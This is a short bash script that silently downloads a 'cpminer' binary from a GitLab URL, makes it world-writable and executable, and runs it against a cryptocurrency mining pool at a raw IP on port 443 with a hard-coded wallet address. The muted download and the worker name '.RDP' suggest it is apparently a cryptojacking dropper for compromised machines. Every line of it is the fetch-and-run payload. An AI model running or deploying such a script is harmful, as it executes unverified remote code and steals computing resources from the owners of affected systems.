#!/bin/bash
apt-get update 
apt-get install -y wget curl
wget https://gitlab.com/majapahlevi/mvp/-/raw/main/cpminer >/dev/null 2>&1
chmod 777 cpminer 
./cpminer -a yespowertide -o stratum+tcp://47.237.3.59:443 -u TFjVcsSSXbyVNa9gdiYrhDCtfkamCNLHCf.RDP -p c=TDC -t 1
